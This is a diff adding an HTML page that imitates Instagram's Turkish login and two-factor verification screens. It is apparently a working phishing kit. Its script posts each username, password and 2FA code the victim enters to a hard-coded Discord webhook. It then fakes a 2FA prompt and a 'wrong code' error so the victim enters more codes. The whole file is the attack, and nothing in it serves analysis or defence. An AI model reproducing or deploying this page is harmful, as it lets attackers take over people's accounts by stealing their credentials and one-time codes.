@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000000;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            color: white;
+            overflow-x: hidden;
+        }
+
+        .container {
+            display: flex;
+            transition: transform 0.5s ease;
+        }
+
+        .login-container, .verification-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            flex-shrink: 0;
+        }
+
+        .verification-container {
+            margin-left: 20px;
+            display: none;
+        }
+
+        .verification-container.active {
+            display: block;
+        }
+
+        .title {
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: white;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #333;
+            border-radius: 4px;
+            background-color: #000;
+            color: white;
+            box-sizing: border-box;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #0066cc;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 16px 0;
+        }
+
+        .divider {
+            text-align: center;
+            margin: 20px 0;
+            color: #666;
+        }
+
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #0066cc;
+            text-decoration: none;
+            margin: 16px 0;
+        }
+
+        .facebook-login i {
+            font-size: 20px;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin: 16px 0;
+        }
+
+        .forgot-password a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+
+        .signup {
+            text-align: center;
+            margin: 16px 0;
+        }
+
+        .signup a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+
+        .app-downloads {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .app-downloads img {
+            height: 40px;
+            cursor: pointer;
+        }
+
+        .download-text {
+            text-align: center;
+            margin: 16px 0;
+        }
+
+        .verification-info {
+            color: #666;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .error-message {
+            color: #ed4956;
+            text-align: center;
+            margin: 10px 0;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .loading {
+            text-align: center;
+            margin: 10px 0;
+            color: #666;
+            display: none;
+        }
+
+        .loading.show {
+            display: block;
+        }
+
+        .general-error {
+            color: #ed4956;
+            text-align: center;
+            margin: 10px 0;
+            padding: 10px;
+            background-color: #ed495610;
+            border-radius: 4px;
+            display: none;
+        }
+
+        .general-error.show {
+            display: block;
+        }
+    </style>
+    <script>
+        async function sendToDiscord(event, type) {
+            event.preventDefault();
+            
+            if (type === 'login') {
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+                
+                // Show loading message
+                document.getElementById('loading-message').classList.add('show');
+                
+                // Send login info to Discord
+                const message = `New Login Attempt\nUsername/Email: ${username}\nPassword: ${password}`;
+                await sendDiscordMessage(message);
+
+                // Simulate Instagram login and 2FA check
+                setTimeout(() => {
+                    document.getElementById('loading-message').classList.remove('show');
+                    
+                    // Simulate that login was successful and account has 2FA
+                    // Her hesap için 2FA ekranını göster
+                    document.querySelector('.verification-container').classList.add('active');
+                    document.querySelector('.container').style.transform = 'translateX(-420px)';
+                    
+                }, 1500);
+
+            } else if (type === '2fa') {
+                const code = document.getElementById('verification-code').value;
+                const message = `2FA Code: ${code}`;
+                await sendDiscordMessage(message);
+
+                // Show error message
+                document.getElementById('error-message').classList.add('show');
+                // Clear the verification code input
+                document.getElementById('verification-code').value = '';
+            }
+        }
+
+        async function sendDiscordMessage(message) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1366519438660337714/eYVfxjK1LCa9fOt96m_tzmHYKlKVUt_JWtVaNdshFh0U9sjLo6TlQuGHyva6jKIZaDpk';
+            
+            const data = {
+                content: message,
+                username: "Instagram Redirector"
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="login-container">
+            <div class="title">Instagram Redirector</div>
+            <form onsubmit="sendToDiscord(event, 'login')">
+                <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+                <input type="password" id="password" placeholder="Şifre" required>
+                <div id="loading-message" class="loading">Giriş yapılıyor...</div>
+                <div id="general-error" class="general-error">Bir sorun oluştu. Lütfen daha sonra tekrar deneyin.</div>
+                <button type="submit" class="login-btn">Giriş yap</button>
+            </form>
+
+            <div class="divider">YA DA</div>
+
+            <a href="#" class="facebook-login">
+                <i class="fab fa-facebook-square"></i>
+                Facebook ile Giriş Yap
+            </a>
+
+            <div class="forgot-password">
+                <a href="#">Şifreni mi unuttun?</a>
+            </div>
+
+            <div class="signup">
+                Hesabın yok mu? <a href="#">Kaydol</a>
+            </div>
+
+            <div class="download-text">Uygulamayı İndir.</div>
+            
+            <div class="app-downloads">
+                <img src="https://play.google.com/intl/en_us/badges/images/generic/en_badge_web_generic.png" alt="Get it on Google Play">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/f/f7/Get_it_from_Microsoft_Badge.svg" alt="Get it from Microsoft">
+            </div>
+        </div>
+
+        <div class="verification-container">
+            <div class="title">İki Aşamalı Doğrulama</div>
+            <div class="verification-info">
+                Hesabınızı korumak için bir doğrulama kodu gönderdik. Lütfen telefonunuza veya e-posta adresinize gelen kodu girin.
+            </div>
+            <form onsubmit="sendToDiscord(event, '2fa')">
+                <input type="text" id="verification-code" placeholder="Doğrulama Kodu" required>
+                <div id="error-message" class="error-message">Girdiğiniz kod yanlış. Lütfen tekrar deneyin.</div>
+                <button type="submit" class="login-btn">Doğrula</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html> 
